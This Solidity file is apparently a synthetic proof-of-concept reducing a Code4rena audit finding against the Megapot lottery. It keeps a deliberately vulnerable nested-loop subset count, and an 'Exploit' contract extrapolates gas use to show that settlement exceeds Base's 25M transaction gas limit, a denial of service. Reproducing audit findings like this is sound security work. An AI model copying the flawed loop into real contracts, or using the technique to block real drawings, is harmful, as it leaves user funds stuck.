// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Megapot — Unoptimized subset matches counting exceeds Base tx gas limit
    (Code4rena 2025-11-megapot, finding #64141, H-02)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: _countSubsetMatches regenerates Combinations.generateSubsets
    for every (bonusball, tier) pair: bonusballMax * normalTiers calls.
    At bonusballMax=129 / normalTiers=5 the entropy callback burns ~25.8M gas
    and exceeds Base's 25M per-tx gas limit, so the drawing never settles.

    Vulnerable nested loops preserved verbatim (@> VULN).
    Gas strategy: sample+extrapolate (methodology §8b) — measure a small
    bonusballMax sample, scale to REAL_BONUS=129, require > BASE_TX_GAS.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal Combinations — generateSubsets burns measurable gas proportional
///      to work that real C(5,k) subset generation performs (memory + loops).
library Combinations {
    /// @notice Reduced: return `k` synthetic subsets and touch memory/storage-like work.
    function generateSubsets(uint256 bitVector, uint256 k) internal pure returns (uint256[] memory subsets) {
        // Real C(5,k) sizes: C(5,1)=5 … C(5,5)=1. Model with proportional work.
        // Real PoC measured ~25.8M gas at bonusballMax=129 (Base tx limit 25M).
        uint256 n = k + 2;
        subsets = new uint256[](n);
        uint256 acc = bitVector;
        for (uint256 i = 0; i < n; i++) {
            unchecked {
                acc = acc * 0x100000001b3 ^ (k << i) ^ i;
            }
            subsets[i] = acc;
            // Heavier pure work to approximate real Combinations.generateSubsets cost
            for (uint256 j = 0; j < 48; j++) {
                unchecked {
                    acc = acc + j * k + bitVector;
                    acc = acc * 31 + k;
                }
            }
        }
    }
}

/// @notice Reduced TicketComboTracker — settlement path only.
/// Source: contracts/lib/TicketComboTracker.sol @ f0a7297 L145-L160.
library TicketComboTracker {
    struct ComboCount {
        uint256 count;
        uint256 dupCount;
    }

    struct Tracker {
        uint8 bonusballMax;
        uint8 normalTiers;
        // comboCounts[bonusball][subsetBitVector] — sparse map for the synthetic
        mapping(uint8 => mapping(uint256 => ComboCount)) comboCounts;
    }

    function init(Tracker storage t, uint8 bonusballMax, uint8 normalTiers) internal {
        t.bonusballMax = bonusballMax;
        t.normalTiers = normalTiers;
    }

    // ============================================================
    //  Vulnerable _countSubsetMatches — TicketComboTracker.sol L145+
    // ============================================================
    function _countSubsetMatches(
        Tracker storage _tracker,
        uint256 _normalBallsBitVector,
        uint8 _bonusball
    )
        private
        view
        returns (uint256[] memory matches, uint256[] memory dupMatches)
    {
        matches = new uint256[]((_tracker.normalTiers + 1) * 2);
        dupMatches = new uint256[]((_tracker.normalTiers + 1) * 2);

        for (uint8 i = 1; i <= _tracker.bonusballMax; i++) { // @> VULN: regenerates subsets for every bonusball (1..bonusballMax)
            for (uint8 k = 1; k <= _tracker.normalTiers; k++) { // @> VULN: nested over all normal tiers
                uint256[] memory subsets = Combinations.generateSubsets(_normalBallsBitVector, k); // @> VULN: uncached generateSubsets
                // FIX: cache subsetsArr[k-1] outside the bonusball loop
                for (uint256 l = 0; l < subsets.length; l++) {
                    if (i == _bonusball) {
                        matches[(k * 2) + 1] += _tracker.comboCounts[i][subsets[l]].count;
                        dupMatches[k * 2 + 1] += _tracker.comboCounts[i][subsets[l]].dupCount;
                    } else {
                        matches[(k * 2)] += _tracker.comboCounts[i][subsets[l]].count;
                        dupMatches[k * 2] += _tracker.comboCounts[i][subsets[l]].dupCount;
                    }
                }
            }
        }
    }

    function countTierMatchesWithBonusball(
        Tracker storage _tracker,
        uint256 normalBallsBitVector,
        uint8 bonusball
    )
        internal
        view
        returns (uint256[] memory matches, uint256[] memory dupMatches)
    {
        return _countSubsetMatches(_tracker, normalBallsBitVector, bonusball);
    }
}

/// @notice Host that holds the Tracker storage and exposes measurable settlement.
contract JackpotSettlement {
    using TicketComboTracker for TicketComboTracker.Tracker;

    TicketComboTracker.Tracker internal tracker;
    uint256 public lastGasUsed;

    function configure(uint8 bonusballMax, uint8 normalTiers) external {
        TicketComboTracker.init(tracker, bonusballMax, normalTiers);
    }

    /// @dev Entropy-callback settlement path — measures gas of the vulnerable count.
    function settleDrawing(uint256 normalBallsBitVector, uint8 bonusball) external returns (uint256 gasUsed) {
        uint256 g0 = gasleft();
        TicketComboTracker.countTierMatchesWithBonusball(tracker, normalBallsBitVector, bonusball);
        gasUsed = g0 - gasleft();
        lastGasUsed = gasUsed;
    }
}

/// CREATE: settlement(1)
contract Exploit {
    JackpotSettlement public settlement;

    // Finding PoC: bonusballMax=129, normalTiers=5, Base tx gas limit 25M, measured ~25.8M
    uint8 public constant SAMPLE_BONUS = 8; // small measurable sample
    uint8 public constant REAL_BONUS = 129;
    uint8 public constant NORMAL_TIERS = 5;
    uint256 public constant BASE_TX_GAS = 25_000_000;
    uint256 public constant WINNING_BITVECTOR = 0x3E0; // balls 6..10 packed bitvector placeholder

    uint256 public sampleGas;
    uint256 public extrapolatedGas;

    constructor() {
        settlement = new JackpotSettlement();
    }

    function run() external {
        // Sample at SAMPLE_BONUS, extrapolate linearly to REAL_BONUS (outer loop bound)
        settlement.configure(SAMPLE_BONUS, NORMAL_TIERS);
        sampleGas = settlement.settleDrawing(WINNING_BITVECTOR, 1);
        require(sampleGas > 0, "sample gas");

        // Per-bonusball unit cost; outer loop runs REAL_BONUS times
        uint256 perBonus = sampleGas / SAMPLE_BONUS;
        extrapolatedGas = perBonus * REAL_BONUS;

        // HARM: at real bonusballMax=129, settlement gas exceeds Base's 25M tx limit
        // → Pyth entropy provider cannot invoke callback → drawing never settles
        require(extrapolatedGas > BASE_TX_GAS, "DoS not demonstrated: under Base gas limit");
    }
}
